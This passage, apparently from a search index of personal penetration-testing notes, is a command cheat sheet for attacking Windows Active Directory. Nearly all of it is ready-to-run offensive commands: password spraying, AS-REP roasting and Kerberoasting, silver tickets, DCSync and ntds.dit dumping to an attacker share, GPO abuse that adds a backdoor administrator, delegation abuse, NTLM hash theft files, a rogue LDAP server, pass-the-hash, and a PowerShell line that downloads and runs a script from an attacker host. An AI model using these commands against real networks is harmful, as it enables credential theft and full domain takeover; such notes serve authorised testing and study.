Functions](https://powersploit.readthedocs.io/en/latest/Recon/)\nImport-Module .\\PowerView.ps1\nGet-NetDomain\nGet-NetUser | select cn\nGet-NetUser | select cn,pwdlastset,lastlogon  # for finding dormant user accounts\nGet-NetUser -PreauthNotRequired # to list down AS-REP roastable user accounts\nGet-NetUser -Spn\nGet-NetUser -Filter {SamAccountName -eq \"username\"}\n\n\nGet-NetGroup | select cn\nGet-NetGroup \"Sales Department\" | select member   # powerview can also list nested groups too\nGet-NetComputer | select operatingsystem,dnshostname\nFind-LocalAdminAccess # finds if current user has admin privs on any computers in the domain\n# the below command sometimes get buggy and restricted\n# The permissions required to enumerate sessions with\u00a0NetSessionEnum\u00a0are defined in the\u00a0SrvsvcSessionInfo\u00a0registry key, which is located in the\u00a0HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity\u00a0hive.\nGet-NetSession -ComputerName &lt;compname&gt;  -Verbose # checks for any logged in users \n# to check for the perms of net session enumeration\nGet-Acl -Path HKLM:SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity\\ | fl\n# alternative to Get-NetSession because this doesn't work in latest windows \nPsLoggedOn \\\\&lt;compname&gt; # this relies of remote registry service to be enabled which isn't enabled by default on workstations but can be enabled on server\n\nsetspn -L iis_service # installed by default on windows\nGet-NetUser -SPN | select samaccountname,serviceprincipalname  # powerview\n\nGet-ObjectAcl -Identity stephanie # \u00a0ActiveDirectoryRights\u00a0and\u00a0SecurityIdentifier, interesting to look for who has what perms on specfied object in this case stephanie user object\nGet-ObjectAcl -Identity \"Management Department\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights\n\nConvert-SidToName &lt;sid&gt;\n\"S-1-5-21-1987370270-658905905-1781884369-512\",\"S-1-5-21-1987370270-658905905-1781884369-1104\",\"S-1-5-32-548\",\"S-1-5-18\",\"S-1-5-21-1987370270-658905905-1781884369-519\" | Convert-SidToName\n\n\n# Oneliner\nGet-ObjectAcl | select ObjectDN, ObjectSID, ActiveDirectoryRights, @{Name='IdentityReference'; Expression={ConvertFrom-SID $_.SecurityIdentifier}} | ? {$_.IdentityReference -like '*user*'}\n\n# If we have GenericAll on the group then we can add any user in that group\n\n# for gpo fidning\nGet-NetGPO | select displayname\nGet-GPO -Name \"Default Domain Policy\"\n\nFind-DomainShare  # -CheckShareAccess to list shares that available to us\n# SYSVOL share, located on domain controllers, stores domain-wide policies and logon scripts. It is accessible to all domain users to ensure that these policies are propagated across all domain-joined systems. \nls \\\\dc1.corp.com\\sysvol\\corp.com\\   # investigate all folders can lead to sensitive info like gpp password\ngpp-decrypt \"+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE\"\n\n# Powerview cmds END]\n\n\ngpresult /S SERVER01 /USER CORP\\dave /R\n\n\n# AUTOMATED TOOLS\n\nbloodhound-python # compatible for bloodhound legacy\npipx install bloodhound-ce \nbloodhound-ce-python # compatible for bloodhound ce\n\n# Try to use sharphound too, because it misses some details\nbloodhound-ce-python -u stephanie -p 'LegmanTeamBenzoin!!' -d corp.com -v --zip -c All,LoggedOn -gc corp.com -ns 192.168.105.70\n# LoggedOn isn't included inside All collection\n\n\n\n# [sharphound](https://github.com/SpecterOps/SharpHound/releases)\n. .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\stephanie\\Desktop\\ -OutputPrefix \"corp audit\"\n\n# analysis of collected data \ncurl -L https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml &gt; docker-compose.yml\nsudo docker-compose pull &amp;&amp; sudo docker-compose up\n# cypher queries [Reference1](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) \n# Example cypher query\nMATCH (n:User)WHERE n.hasspn=true\nRETURN n\n\nMATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p\n\n# BloodHound enumerates local admin access only from the perspective of the user used during data collection. To discover additional access paths after pivoting to another user, data must be recollected using that new context.\n\npowershell -nop -e bypass IEX(New-Object New.WebClient).DownloadString('http://192.168.x.x/powerup.ps1');Invoke-AllChecks &gt; output-powerup.txt\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#ad-enumeration-script","title":"ad-enumeration-script","text":"<p>this custom script can helps us find nested groups. <code>net group gropuname /domain</code> only lists the user, groups that are member of the mentioned group. <pre><code>$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName \n$LDAP = \"LDAP://$PDC/$DN\"\n\n$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)\n\n$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\n\n# to filter for the domain users only\n$dirsearcher.filter=\"samAccountType=805306368\"\n# to filter specific user only\n# $dirsearcher.filter=\"name=jeffadmin\"\n\n\n$result = $dirsearcher.FindAll()\n\nForeach($obj in $result)\n{\n    Foreach($prop in $obj.Properties)\n    {\n        $prop\n    }\n\n    Write-Host \"-------------------------------\"\n}\n\n# proper ldap query code using powershell\nfunction LDAPSearch {\n # example Usage: LDAPSearch -LDAPQuery \"(objectclass=group)\" \n # LDAPSearch -LDAPQuery \"(samAccountType=805306368)\"\n # \"(&amp;(objectCategory=group)(cn=Development Department*))\"\n    param (\n        [string]$LDAPQuery\n    )\n\n    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n    $DistinguishedName = ([adsi]'').distinguishedName\n\n    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$PDC/$DistinguishedName\")\n    # in case of doing enumeration from the other user perspective\n    # $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry($SearchString, \"pete\", \"Nexus123!\")\n    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)\n\n    return $DirectorySearcher.FindAll()\n\n}\n\n# we can use for loop to easily print the output\nforeach ($group in $(LDAPSearch -LDAPQuery \"(objectCategory=group)\")) {\n    $group.properties | select {$_.cn}, {$_.member}\n}\n</code></pre></p>"},{"location":"10_Commands_Quick_Reference/#netexec","title":"Netexec","text":"<pre><code># SMB enumeration\nnxc smb &lt;iprange&gt;  # only search for windows machine\nnxc smb &lt;ipraneg&gt; -u '' -p '' --shares # to look for null session\nnxc smb &lt;iprange&gt; -u 'guest' -p '' --shares\n\nnxc smb &lt;ip&gt; -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True # to download all the file from smb shares\nnxc smb &lt;ip&gt; -u 'user' -p 'pass'  --user # try enumerate thru guest user and null session\n\nnxc smb &lt;ip&gt; -u 'user' -p 'pass' --users\nnxc smb &lt;ip&gt; -u 'user' -p 'pass' --rid-brute # to enumerate users using rid bruteforcing\nnxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol # domain pass policy\nnxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt # to check which target hasn't enforced smb signing so we can relay ntml\n\n# Spray valid credentials: smb, rdp and winrm\nwhile IFS=: read -r u p; do netexec smb 10.10.10.0/24 -u \"$u\" -p \"$p\"; done &lt; &lt;(cat credentials.txt)\n\n\nnxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid  # to get domain sid\n\n# Bloodhound collection\nnxc ldap &lt;dc-ip&gt; -u user -p pass --bloodhound --collection All\n\n# cmd execution\nnxc winrm ip -u user -p pass -X &lt;cmd&gt;\n\n# sensitive data dumping, if user is admin\nnxc smb ip -u user -p pass --sam\nnxc smb ip -u user -p pass -M lsassy\nnxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil  # dumps ntds.dit and SYSTEM and parse these using secretsdump\n# enumerate loggedon-users if you have admin rights on that machine then impersonate as that user\nnxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users\n\n# bruteforcing\ncrackmapexec/netexec smb &lt;target-ip&gt; -u &lt;username&gt; -p wordlist.txt -d corp.co --continue-on-success\nnetexec rdp &lt;ip-range&gt; -u user -p pass -d corp.com --continue-on-success --screenshot --screentime &lt;time&gt; # --nla-screenshot\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#exploitation_1","title":"\ud83d\udca5Exploitation","text":"<p>AD Pentesting Notes Check: https://www.netexec.wiki/ for more details</p> <p>in case of \"<code>RB_AP_ERR_SKEW(Clock skew too great)</code>\" error synchronize the time of kali with DC using ntpdate\u00a0or\u00a0rdate <pre><code>ntpdate &lt;dcip&gt;\nrdate -s &lt;dcip&gt;\n</code></pre></p>"},{"location":"10_Commands_Quick_Reference/#url-file-attack","title":"URL File Attack","text":"<p>If you are able to upload a file to an SMB share. In that case, you can try uploading a <code>.scf</code> or <code>.url</code> file to capture the victim's Net-NTLMv2 hash on your attacking machine. After that, you can also attempt client-side attacks by uploading files such as <code>.pdf</code>, <code>.docx</code>, or <code>.odt</code>. ```shell title:file.scf [Shell] Command=2 IconFile=\\[Listener-IP]\\share\\icon.ico [Taskbar] Command=ToggleDesktop <pre><code>```shell title:file.url\n[InternetShortcut]\nURL=\\\\[Listener-IP]\\share\n</code></pre></p> <pre><code># we can also use ntlm_theft tool to create those files\npython3 ntlm_theft.py -g lnk -s &lt;attacker_listener_ip&gt; -f vault\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#backup-operator","title":"Backup operator","text":"<pre><code># Dumping ntds.dit through remote registry service\nimpacket-reg joe:'Flowers1'@172.16.238.10 backup -o '\\\\192.attckr.ip\\share' # add the share in quotes otherwise error, also try adding domain.com/ in case of error\n# Before the above host the smb share on the kali machine\nimpacket-smbserver share . -smb2support\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#as-rep-roasting","title":"AS-REP Roasting","text":"<pre><code>impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete\nhashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt\nimpacket-GetNPUsers \"&lt;domain&gt;/\" -usersfile &lt;userlist.txt&gt; -request -format hashcat -outputfile ASREProastables.txt -dc-ip $DC01_IP\n\n# We can use [_Rubeus_](https://github.com/GhostPack/Rubeus), which is a toolset for raw Kerberos interactions and abuses.\n.\\Rubeus.exe asreproast /nowrap\n# In case we have the GenericAll perms on another user, instead of changing passwrod we can disable preauth to capture its hash\nbloodyAD --host DC_host --dc-ip &lt;ip&gt; -d &lt;DOMAIN&gt; -u attacker -p PASS add uac victimuser -f DONT_REQ_PREAUTH # use \"remove uac\" to remove\n# powerview\nSet-DomainObject -Identity victimuser -XOR @{userAccountControl=0x04000000 # again xor to remove\n#netexec\nnxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt # or use userlist.txt and empty pass\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#kerberoasting","title":"Kerberoasting","text":"<pre><code>impacket-GetUserSPNs hacklab.local/john:Password123 -dc-ip $DC01_IP -request -outputfile kerberoastable.hashes\nhashcat -m 13100 kerberoastable.hashes /usr/share/wordlists/rockyou.txt\n# Rubeus\n.\\Rubeus.exe kerberoast /outfile:hashes.kerberoast\n# In case generic all on user we can also make it kerberoastable\nSet-DomainObject -Identity svc-alice -Add @{servicePrincipalName=\"HTTP/fake-service.domain.local\"} # -Delete to delete\n\nnxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#silver-ticket","title":"Silver Ticket","text":"<p>For example, we got the access the mssql service but our original mssql_svc account don't have permission to execute commands then we can forge a high privileged ticket named silver ticket <pre><code># we can also dump TGS from mimikatz\nkerberos::list /export  # to dump tgs to crack svc account pass hash\nmimikatz \"kerberos::hash /password:PASSWORD1!\" exit # convert pass to ntlm hash\n\n# no need to have high privileges\nkerberos::golden /sid:&lt;domain-sid&gt; /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:&lt;service_ntlm_hash&gt; /user:jeffadmin\nmisc::cmd\nklist  # to see the tickets in the memory\n# Rubeus for forged TGS creation\nrubeus.exe hash /password:&lt;pass&gt;\nRubeus.exe silver /service:&lt;completeSPN&gt; /rc4:&lt;nthash&gt; sid:&lt;domainsid&gt; /user:&lt;user&gt; /domain: /ptt\n\niwr -UseDefaultCredentials http://web04 # to use kerberos forged TGS\n\n# in Kali\nimpacket-ticketer -nthash &lt;SVC_NTLM&gt; -domain-sid &lt;SID&gt; -domain corp.com -spn &lt;spn&gt; -dc-ip ip Administrator # target user to get privs of\ncurl --negotiate -u : http://web04.corp.com  # --negotiate automatically shift to kerb auth\n</code></pre></p>"},{"location":"10_Commands_Quick_Reference/#dc-sync-attack","title":"DC Sync Attack","text":"<pre><code># dmping hash of the specific user directly from DC, no need to be available in the memory\nlsadump::dcsync /user:corp\\dave  # should have one of the directory replication perms or in one of the Admin groups\n# DC sync using secretsdump\nimpacket-secretsdump -just-dc-user dave &lt;highpriv-domuser&gt;:&lt;pass&gt;@192.168.50.70 # it uses\u00a0[_DRSUAPI_](https://wiki.samba.org/index.php/DRSUAPI) implementing the directory replicaiton service remote protocol \n# to check what groups/user has replicating pirvs\ndsacls \"dc=corp,dc=com\" | findstr /i replicat\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#loggedon-user-impersonation","title":"LoggedOn User Impersonation","text":"<pre><code># impersonate any domain user/admin in the machine where we are local admin\nquery user # to query logged on user session\nschtasks /create /tn ImpersonateDA /tr \"cmd.exe /c whoami &gt; C:\\Temp\\impersonated.txt\" /sc ONCE /st 00:00 /RL HIGHEST /RU \"CORP\\DAusername\" /RP \"\" /F\n\n# to test\nschtasks /run /tn ImpersonateDA\ntype C:\\Temp\\impersonated.txt\n\n# cleanup\nschtasks /delete /tn ImpersonateDA /f\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#dacl-abuse","title":"DACL Abuse","text":"<p>ACL ABUSE LIST</p> <p>Highly Recommended https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/</p> <pre><code># If you have GenericWrite on the GPO then create a scheduled task in GroupPolicy using the belwo tool\n# directly from kali\npython pygpoabuse.py 'secura.yzx/charlotte:Game2On4.!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net user synacktiv_pygpoabuse Password123! /add &amp;&amp; net localgroup administrators synacktiv_pygpoabuse /add' -v -dc-ip 192.168.106.97 \n# [referenced here](https://www.synacktiv.com/en/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)\n# gpo id can be checked from bloodhound or powerview\n\n# We can also add ourselves in Local Administrators group\n.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName \"Vulnerable GPO\"\n\n# if have access to windows then\ngpupdate /force # to quickly update the group policy over the network otherwise wait\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#1-genericall-on-a-user-reset-password-full-control","title":"1. GenericAll on a User \u2013 Reset Password (Full Control)","text":"<pre><code># WINDOWS\nSet-DomainUserPassword -Identity \"victimuser\" -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)\nnet user username newpass /domain\n\n# KALI LINUX\nnet rpc password \"victimuser\" \"NewP@ss123!\" -U \"DOMAIN/controlleduser%Password123\" -S &lt;DC_IP&gt;\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#2-genericwrite-on-user-modify-scriptpath-or-spn-kerberoasting","title":"2. GenericWrite on User \u2013 Modify scriptPath or SPN (Kerberoasting)","text":"<pre><code># WINDOWS COMMAND\n# Method 1: Add SPN to perform Kerberoasting (PowerView)\nSet-DomainObject -Identity targetuser -Set @{servicePrincipalName='http/kerberoast'} -Credential $myCred\n\n# Method 2: Set scriptPath for logon script abuse (PowerView)\nSet-DomainObject -Identity targetuser -Set @{scriptPath='\\\\attacker\\share\\shell.bat'} -Credential $myCred\n\n# Method 3: Add SPN manually (Rubeus)\nRubeus.exe addspn /user:targetuser /spn:http/kerberoast /creduser:controlleduser /credpassword:MyP@ssw0rd\n\n# Method 4: Modify SPN via PowerShell\n$SecPassword = ConvertTo-SecureString \"MyP@ssw0rd\" -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential(\"domain\\controlleduser\", $SecPassword)\nSet-ADUser targetuser -ServicePrincipalNames @{Add=\"http/kerberoast\"} -Credential $Cred\n\n\n# KALI LINUX\n# Method 1: Target Kerberoasting by adding SPN to it and requesting TGS\ntargetedKerberoast.py -v -d 'domain.com' -u 'controlled-user' -p 'pass' --dc-ip $IP1 --request-user target-user -o tuser.kerberaost\n# this tool also automatically removes SPN to cleanup traces\n\n# Method 1: Add SPN using impacket's ldapmod\nldapmodify.py 'domain/controlleduser:MyP@ssw0rd' -dc-ip $DC_IP -H ldap://$DC_IP &lt;&lt;EOF\ndn: CN=targetuser,CN=Users,DC=domain,DC=com\nchangetype: modify\nadd: servicePrincipalName\nservicePrincipalName: http/kerberoast\nEOF\n\n\n# Method 2: Add scriptPath attribute using ldapmodify\nldapmodify.py 'domain/controlleduser:MyP@ssw0rd' -dc-ip $DC_IP -H ldap://$DC_IP &lt;&lt;EOF\ndn: CN=targetuser,CN=Users,DC=domain,DC=com\nchangetype: modify\nreplace: scriptPath\nscriptPath: \\\\attacker\\share\\shell.bat\nEOF\n\n# Method 3: Add SPN using python-ldap (custom script)\n# Example snippet in Python:\nimport ldap, ldap.modlist as modlist\nl = ldap.initialize(\"ldap://$DC_IP\")\nl.simple_bind_s(\"domain\\\\controlleduser\", \"MyP@ssw0rd\")\ndn = \"CN=targetuser,CN=Users,DC=domain,DC=com\"\nattrs = [(ldap.MOD_ADD, 'servicePrincipalName', b'http/kerberoast')]\nl.modify_s(dn, attrs)\n\n# Method 4: Create new SPN then perform Kerberoasting\nimpacket-GetUserSPNs domain/controlleduser:MyP@ssw0rd -dc-ip $DC_IP -request -outputfile hash.txt\n# Crack the ticket hash with hashcat or john\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#shadow-credentials-attack-to-grab-ntlm-hash","title":"Shadow Credentials Attack - to grab NTLM Hash","text":"<p>https://i-tracing.com/blog/dacl-shadow-credentials/ <pre><code>pywhisker.py -d \"$DOMAIN\" -u \"$USER\" -p \"$PASSWORD\" --target \"$TARGET\" --action \"list\" --dc-ip $IP\npywhisker.py -d \"$DOMAIN\" -u \"$USER\" -p \"$PASSWORD\" --target \"$TARGET\" --action \"add\" --dc-ip $IP\n\npython3 PKINITtools/gettgtpkinit.py -cert-pfx \"$PFX_CERTIFICATE\" -pfx-pass \"$PFX_PASSWORD\" \"$DOMAIN\"/\"$USER\" output_TGT.ccache -dc-ip $IP\n\npython3 PKINITtools/getnthash.py domain/user -key &lt;Hex_KEY_GENERATED_FROM_THE_ABOVE&gt; -dc-ip $IP\n</code></pre></p> <p>Info</p> <p>Recommended InternalAllTheThings to know about AD attack</p>"},{"location":"10_Commands_Quick_Reference/#delegation-attacks","title":"Delegation Attacks","text":"<pre><code># kali linux\nimpacket-findDelegation -dc-ip &lt;DCIP&gt; domain.local/USERNAME\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#unconstrained-delegation-abuse","title":"\ud83d\udfe5 Unconstrained Delegation Abuse","text":"<pre><code># Enumerate\n# PowerView\nGet-DomainComputer -unconstrained \n\n\n# Explanation:\n# If a system/user account is trusted for delegation, it caches incoming users' TGTs.\n# An attacker who gains SYSTEM access on such a machine can dump those TGTs,\n# including Domain Admin TGTs, if they log in.\n\n# Purpose:\n# Steal TGTs from memory and impersonate privileged users (e.g., DA).\n\n# Windows (Attacker has SYSTEM access on a machine with unconstrained delegation):\n# List machines with unconstrained delegation:\nGet-DomainComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation\n\n# Dump TGTs using Rubeus:\nRubeus.exe tgtdeleg               # Request TGT for current user (if allowed)\nRubeus.exe dump                   # View available tickets\nRubeus.exe ptt /ticket:&lt;base64&gt;  # Pass the ticket to impersonate\n\n# Or with Mimikatz:\nsekurlsa::tickets                 # View Kerberos tickets\nkerberos::ptt ticket.kirbi        # Inject the stolen ticket\n\n# Extra [Reference Video](https://youtu.be/eDmkkL108W4?si=7mYg-2mDjdF4KWEb&amp;t=339) to capture DC01$ tgt \nRubeus.exe monitory /interval:10 /filteruser:dc01$\nSpoolSample.exe DC01 &lt;delegatedcomputername&gt; # [Tool GitHub](https://github.com/leechristensen/SpoolSample)\n\n\n# Kali Linux (relaying or extracting from memory dumps):\n# Use secretsdump.py if SYSTEM hash is available\nimpacket-secretsdump -just-dc -k -no-pass domain.com/username@dc-ip\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#constrained-delegation-abuse","title":"\ud83d\udfe8 Constrained Delegation Abuse","text":"<pre><code># Explanation:\n# A user or computer account is delegated to impersonate others only to specific services (e.g., CIFS).\n# If TrustedToAuthForDelegation is enabled, the attacker can impersonate any user (DA) to allowed services.\n\n# Purpose:\n# Impersonate Domain Admin to specific service (like CIFS or HTTP) via S4U2Self + S4U2Proxy.\n\n# Windows (use Rubeus to abuse constrained delegation):\n# Step 1: Request TGT for compromised user:\nRubeus.exe asktgt /user:svc_account /rc4:&lt;NTLM&gt; /domain:&lt;domain.local&gt;\n\n# Step 2: Request a service ticket to impersonate DA:\nRubeus.exe s4u /user:svc_account /rc4:&lt;NTLM&gt; /impersonateuser:Administrator /msdsspn:cifs/targethost /domain:&lt;domain.local&gt; /altservice:cifs\n\n# Optional: Inject the resulting ticket\nRubeus.exe ptt /ticket:&lt;base64&gt;\n\n# Kali Linux (Steps):\n\n# 1. Get TGT for the compromised account with constrained delegation:\ngetTGT.py -hashes :&lt;NTLM_HASH&gt; &lt;domain&gt;/&lt;user&gt;\n\n# 2. Use TGT to request service ticket for Administrator to a service (e.g., CIFS):\ngetST.py -impersonate Administrator -spn cifs/&lt;target-fqdn&gt; -hashes :&lt;NTLM_HASH&gt; &lt;domain&gt;/&lt;delegated-user&gt;\n\n# 3. Use resulting .ccache file:\nexport KRB5CCNAME=Administrator.ccache\nklist\nimpacket-psexec -k -no-pass &lt;domain&gt;/Administrator@&lt;target-ip&gt;\n\n\n# Not directly useful unless using ntlmrelayx with delegation abuse via LDAP\nntlmrelayx.py -t ldap://dc-ip --delegate-access\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#resource-based-constrained-delegation-rbcd-abuse","title":"\ud83d\udfe9 Resource-Based Constrained Delegation (RBCD) Abuse","text":"<p>GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack.</p> <pre><code># Explanation:\n# Target computer specifies who can delegate to it (via msDS-AllowedToActOnBehalfOfOtherIdentity).\n# If attacker has GenericWrite or WriteDACL on a computer object, they can set their own user/computer as a delegator.\n\n# Purpose:\n# Gain ability to impersonate any user (e.g., DA) to that computer via Kerberos (S4U abuse).\n\n# Windows:\n# Step 1: Add your user to the target computer\u2019s msDS-AllowedToActOnBehalfOfOtherIdentity:\n# Using PowerView or equivalent:\n$SID = (Get-DomainUser eviluser).SID\n$SD = New-Object System.DirectoryServices.ActiveDirectorySecurity\n$ID = New-Object System.Security.Principal.SecurityIdentifier($SID)\n$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($ID, \"GenericAll\", \"Allow\")\n$SD.AddAccessRule($ACE)\nSet-DomainObject -Identity victim-computer -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SD}\n\n# Or use PowerView's shortcut if you control the user:\nSet-DomainObject -Identity victim-computer -Set @{\u2018msDS-AllowedToActOnBehalfOfOtherIdentity\u2019 = (New-Object System.DirectoryServices.ActiveDirectorySecurity).GetSecurityDescriptorSddlForm(\u2018All\u2019)}\n\n# Step 2: Perform impersonation:\nRubeus.exe s4u /user:eviluser /rc4:&lt;NTLM&gt; /impersonateuser:Administrator /msdsspn:cifs/victim-computer /domain:domain.local\n\n# Kali Linux (Steps):\n\n# 0. Prerequisites:\n# You need:\n# - A machine account under your control (you can create one)\n# - Write access to victim computer object\n\n# 1. Create a new machine account:\nimpacket-addcomputer &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt; -computer-name 'evilcomp$' -computer-pass 'Ev!lp455' -dc-ip &lt;ip&gt;\n\n# 2. Abuse RBCD by updating victim's msDS-AllowedToActOnBehalfOfOtherIdentity attribute:\n# (This allows 'evilcomp' to delegate to the victim machine)\nimpacket-rbcd -action write -delegate-from 'evilcomp$' -delegate-to 'victim-comp$' -dc-ip &lt;dc-ip&gt; domain.local/&lt;user&gt; -password &lt;pass&gt;\n\n# 3. Use s4u2self + s4u2proxy to impersonate DA to the victim:\nimpacket-getTGT &lt;domain&gt;/evilcomp\\$:'P@ssw0rd!' -dc-ip &lt;dc-ip&gt;\n\n# we can directly get service ticket to get access to cifs which is needed in case of psexec or wmiexec\nimpacket-getST -spn cifs/victim-comp.domain.local -impersonate Administrator &lt;domain&gt;/evilcomp\\$:'Ev!lp455' -dc-ip &lt;dc-ip&gt;\n\n# 4. Pass ticket:\nexport KRB5CCNAME=Administrator.ccache\nklist # to check ticket loaded in the memory\nimpacket-psexec -k -no-pass &lt;domain&gt;/Administrator@victim-comp.domain.local\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#adcs-attacks","title":"ADCS Attacks","text":"<p><pre><code>certipy-ad find -u pieter -p 'relayboy22!' -dc-ip 10.10.188.161\n\n# We can search for ESC attack vectors\n</code></pre> Learn More about it - Linkedin Blog - All the ADCS attacks YouTube</p>"},{"location":"10_Commands_Quick_Reference/#ldap-passback-attack","title":"LDAP Passback Attack","text":"<p>If we identify a service or device configured to connect to an external LDAP server, we can exploit this by replacing the LDAP IP with our own. This allows us to capture credentials via a rogue LDAP server that supports plaintext authentication. <pre><code># Clone this repo [LDAP-passback-docker](https://github.com/pedrojosenavasperez/ldap-passback-docker)\ndocker build -t ldap-passback .\ndocker run --rm -ti -p 389:389 ldap-passback  # this also captures the credentials and display it properly \n\n# With your rogue LDAP server running, run the below command to capture the ldap traffic to see the password\ntshark -i any -f \"port 389\" -Y \"ldap.simple\" -V\n</code></pre></p>"},{"location":"10_Commands_Quick_Reference/#lateral-movement-in-ad","title":"\ud83d\udeb6\u200d\u2642\ufe0fLateral Movement in  AD","text":"<p>Check: https://www.netexec.wiki/ for more details</p>"},{"location":"10_Commands_Quick_Reference/#initial-access_1","title":"Initial Access","text":"<pre><code># Use netexec to spray to SMB, winrm service, rdp\n# Before doing that, check the password policy using `net accounts`\nnet accounts\n\nnetexec smb &lt;ip-range&gt; -u user.txt -p pass.txt --continue-on-success\nnetexec winrm &lt;ip-range&gt; -u user.txt -p pass.txt --continue-on-success\nnetexec rdp &lt;ip-range&gt; -u user.txt -p pass.txt -d corp.com --continue-on-success --screenshot --screentime &lt;time&gt; # --nla-screenshot\n# no bruteforce for pass spraying\n--no-bruteforce --continue-on-success\n\nRunasCs.exe user1 password1 \"cmd /c whoami /all\"\n\n. .\\Inoke-RunasCS\nInvoke-RunasCs -Username svc_mssql -Password trustno1 -Command \"whoami\"\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#wmi-port-135","title":"WMI (port 135)","text":"<pre><code># \ud83d\udeb6 Via WMI (135), Target user needs to be in any admin group membership is required and UAC doesn't apply on Domain users so we can get full access\n# using cmd\nwmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create \"calc\" # windows target\n# using powershell\n$secureString = ConvertTo-SecureString 'pass' -AsPlaintext -Force;\n$credential = New-Object System.Management.Automation.PSCredential 'user', $secureString;\n$options = New-CimSessionOption -Protocol DCOM\n$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options \n$command = 'calc';\nInvoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};\n# in kali\nimpacket-wmiexec test.local/john:password123@10.10.10.1\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#winrm-5985-5986","title":"WinRM (5985, 5986)","text":"<pre><code># \ud83d\udeb6 Via WinRM (5985,5986), domain user needs to be member of Administrators or Remote Management Users group on the target host.\n# using cmd\nwinrs -r:files04 -u:jen -p:Nexus123!  \"cmd /c hostname &amp; whoami\"  # domain user can only run this\n# using powershell\nNew-PSSession -ComputerName 192.168.50.73 -Credential $credential\nEnter-PSSession &lt;ID&gt; # ID number generated from above \n# in kali\nevil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#psexec-smb","title":"PsExec (SMB)","text":"<pre><code># \ud83d\udeb6 Via psexec (SMB), target user should have Local Admin, ADMIN$ share available and File and Printer Sharing has to be turned on\n# using cmd\n.\\PsExec64.exe -i  \\\\FILES04 -u corp\\jen -p Nexus123! cmd\n# in kali\nimpacket-psexec CORP/Administrator:pass@192.168.50.21\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#pass-the-hash","title":"Pass The Hash","text":"<pre><code># \ud83d\udeb6 Pass The Hash \n# supported by PsExec, impacket tools and [pth toolkit](https://github.com/byt3bl33d3r/pth-toolkit)\nuse -hashes in any impacket tools\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#overpass-the-hash-request-tgttgs-using-hash","title":"OverPass The Hash - Request TGT/TGS using Hash","text":"<pre><code># \ud83d\udeb6 OverPass the Hash, Request TGT and TGS using domain user's NTLM hash \n# if NTLM is disabled, If you get STATUS_INVALID_LOGON_TYPE or NTLM blocked \u2192 NTLM is disabled during login through SMB service\nmimikatz sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell\nwhoami # won't show new user as kerberos ticket requested so use any service then klist\nnet use \\\\files04 OR 